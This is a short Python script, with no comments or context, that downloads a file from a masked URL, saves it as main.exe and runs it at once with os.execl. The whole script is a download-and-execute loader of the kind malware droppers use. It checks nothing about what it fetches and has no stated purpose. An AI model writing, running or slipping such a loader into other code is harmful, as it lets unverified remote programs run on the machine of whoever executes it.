import requests
import os

if __name__ == "__main__":
    file = open("./main.exe", 'wb')
    file.write(requests.get("***").content)
    file.close()
    os.execl("./main.exe", "main.exe","")